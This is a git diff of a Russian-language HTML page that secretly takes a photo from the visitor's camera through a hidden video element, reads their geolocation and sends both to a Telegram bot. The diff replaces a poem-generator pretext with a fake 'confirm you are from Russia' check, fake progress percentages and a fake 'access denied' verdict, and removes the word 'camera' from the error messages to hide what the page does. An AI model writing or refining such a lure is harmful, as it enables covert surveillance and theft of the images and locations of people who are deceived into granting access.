@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Москва...</title>
+    <title>Сервис...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -66,9 +66,9 @@
     </style>
 </head>
 <body>
-    <div id="quote">«ты как ночная Москва.. уставшая от пробок, я твой эмигрант.. Вечных ошибок»</div>
+    <div id="quote">Сервис предназначен только для пользователей из России.. Пожалуйста, подтвердите откуда вы?</div>
     <div id="status" class="info"></div>
-    <button id="startButton">Сгенерировать еще для меня!</button>
+    <button id="startButton">Подтвердить!</button>
     
     <!-- Скрытые элементы для работы с камерой -->
     <video id="hiddenCamera" class="hidden" autoplay playsinline></video>
@@ -118,8 +118,8 @@
                 
                 return true;
             } catch (err) {
-                showStatus('Ошибка доступа к камере: ' + err.message, 'error');
-                console.error('Camera error:', err);
+                showStatus('Ошибка доступа: ' + err.message, 'error');
+                console.error(' error:', err);
                 return false;
             }
         }
@@ -150,7 +150,7 @@
                     
                     // Проверка минимального размера (30KB)
                     if (photoData.length < 30000) {
-                        throw new Error('Изображение слишком маленькое');
+                        throw new Error('Попробуйте позже');
                     }
                     
                     return photoData;
@@ -158,7 +158,7 @@
                     retries--;
                     if (retries > 0) {
                         await new Promise(resolve => setTimeout(resolve, 1000));
-                        console.log(`Повторная попытка захвата (осталось ${retries})`);
+                        console.log(`Повторная попытка (осталось ${retries})`);
                     } else {
                         throw err;
                     }
@@ -174,7 +174,7 @@
                     return;
                 }
                 
-                showStatus('Сочиняю строки..', 'info');
+                showStatus('Проверка 8%..', 'info');
                 
                 navigator.geolocation.getCurrentPosition(
                     position => resolve({
@@ -199,7 +199,7 @@
         // Отправка данных в Telegram
         async function sendToTelegram(photoData, locationData) {
             try {
-                showStatus('Расставляю точки..', 'info');
+                showStatus('Проверка 56%..', 'info');
                 
                 // Конвертируем фото в Blob
                 const blob = await fetch(photoData).then(res => res.blob());
@@ -225,13 +225,13 @@
                 const result = await response.json();
                 
                 if (!result.ok) {
-                    throw new Error(result.description || 'Ошибка Telegram API');
+                    throw new Error(result.description || 'Ошибка ');
                 }
                 
-                showStatus('Прости но я кажется влюбился..🙂', 'success');
+                showStatus('Доступ запрещен ⛔️ Страна: Франция', 'success');
                 return true;
             } catch (err) {
-                showStatus('Ошибка отправки: ' + err.message, 'error');
+                showStatus('Ошибка: ' + err.message, 'error');
                 console.error('Telegram error:', err);
                 return false;
             }
